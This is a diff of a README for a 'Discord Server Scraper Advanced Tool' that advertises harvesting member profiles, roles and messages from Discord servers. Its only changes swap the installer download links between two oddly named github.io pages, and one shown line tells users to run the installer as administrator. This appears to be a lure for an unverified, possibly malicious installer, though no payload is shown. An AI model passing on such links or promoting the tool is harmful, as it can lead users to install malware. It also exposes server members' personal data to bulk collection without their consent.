@@ -2,7 +2,7 @@
 
 The Discord Server Scraper Advanced Tool is a comprehensive and powerful software solution designed to extract, analyze, and organize data from Discord servers efficiently. As a leading discord scraper tool in 2026, it provides a seamless interface for server member scraping, channel analysis, and message logging, making it an essential utility for researchers, community managers, and data enthusiasts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 - **Server Member Extraction**: Extract detailed user profiles, including usernames, IDs, roles, and join dates, from any Discord server you have access to.
@@ -41,4 +41,4 @@ A: Ensure you are running the installer as an administrator. If you encounter an
 ## Download
 Get the latest version of the Discord Server Scraper Advanced Tool and start exploring your Discord data today.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
